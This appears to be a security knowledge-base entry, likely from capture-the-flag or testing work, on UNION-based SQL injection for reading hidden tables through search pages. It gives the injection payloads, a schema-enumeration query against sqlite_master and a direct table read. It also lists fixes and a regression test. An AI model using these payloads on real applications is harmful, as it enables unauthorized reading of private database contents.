# UNION SQLi Hidden-Table Read

## Date

2026-07-08

## Target Type

Search pages, report pages, list views, and catalog interfaces that render SQL query results directly to users

## Bug Class

String-literal SQL injection with `UNION`-based exfiltration from hidden tables

## Initial Signal

A user-controlled parameter such as `q`, `search`, `title`, or `name` changes the rows shown on a page, and syntax errors are reflected to the client.

Common clues:

```text
unrecognized token
syntax error
near "UNION"
different number of result columns
```

If the app claims the query "only returns records from one table," treat that as a hypothesis, not a guarantee.

## Pattern

The application builds SQL like:

```sql
SELECT title, author FROM books WHERE title LIKE '%[q]%'
```

If `[q]` is concatenated directly, the attacker can close the string and append a second query:

```sql
' UNION SELECT value, 'x' FROM flags--
```

The only hard requirement is that the injected `UNION` query match the base result column count.

## Trust Boundary

The UI may only display one entity type, but SQL decides what rows are returned. Once the attacker controls query syntax, hidden tables in the same database are reachable unless permissions prevent it.

## Investigation Workflow

1. Confirm the parameter affects a SQL-backed result set.
2. Trigger a quote error to prove string-literal context.
3. Determine the `UNION` column count.
4. Enumerate schema through metadata tables.
5. Read the smallest target value from the hidden table.

## SQLite Reproduction

Quote probe:

```text
'
```

Column-count probe:

```text
' UNION SELECT 1,2--
```

Schema enumeration:

```sql
' UNION SELECT sql, 'x' FROM sqlite_master WHERE type='table'--
```

Direct table read:

```sql
' UNION SELECT value, 'x' FROM flags--
```

## DB-Specific Metadata

SQLite:

```text
sqlite_master
```

MySQL:

```text
information_schema.tables
information_schema.columns
```

PostgreSQL:

```text
pg_tables
information_schema.columns
```

## Why Failed Tests Fail

- Wrong `UNION` column count.
- Type mismatch in strongly typed DB contexts.
- Input is escaped or parameterized.
- Error output is suppressed, making enumeration slower.
- The DB account lacks permission to read the hidden table.

## Why Working Tests Work

The injection escapes a string literal and appends a second query with the same visible projection shape as the original one. The application renders the returned rows without distinguishing whether they came from the intended table or the injected `UNION` branch.

## Impact

- Read arbitrary tables visible to the DB user.
- Enumerate schema and pivot from public data to private/admin tables.
- Turn a harmless search page into a database disclosure endpoint.

## Fix

- Use parameterized queries everywhere.
- Avoid reflecting raw database errors.
- Restrict DB privileges for public-facing read paths.
- Keep sensitive tables out of the same least-privilege read scope.

## Regression Test

These must not alter query structure:

```text
'
' UNION SELECT 1,2--
' UNION SELECT sql, 'x' FROM sqlite_master WHERE type='table'--
```

## Future Checklist Item

For string-based search SQLi, test `UNION` column count before boolean payloads if the app visibly renders tabular results.
